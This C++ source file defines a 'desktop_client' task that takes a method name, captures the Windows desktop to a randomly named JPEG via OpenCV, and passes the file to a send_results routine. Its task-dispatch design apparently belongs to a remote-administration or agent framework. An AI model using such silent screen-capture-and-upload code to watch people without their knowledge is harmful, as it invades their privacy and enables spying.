#include "desktop_client.h"

desktop_client::desktop_client()
{
	base_path = "user/results_desktop/";
	path = "user/results";
}

void desktop_client::execute()
{
	auto funct = fetch_function(results["method"]);
	results["completed"] = funct();
}

void desktop_client::on_execute()
{
	send_results(results["id"], path_on_method, file_name);
}

void desktop_client::run(
	std::string id,
	bool response,
	std::string method,
	std::vector<std::string> args
) {
	base_task::run(id, response, method, args);
}

_function desktop_client::fetch_function(std::string _function_name)
{
	if (_function_name == "desktop_capture")
		return std::bind(
			&desktop_client::desktop_capture,
			this
		);


	return _function();
}

bool desktop_client::desktop_capture()
{
	HWND hwndDesktop = GetDesktopWindow();
	file_name = hyz::rand2str("", ".jpg");
	cv::Mat src = hyz::hwnd2mat(hwndDesktop);
	if(cv::imwrite(file_name, src))
		return true;

	return false;
}
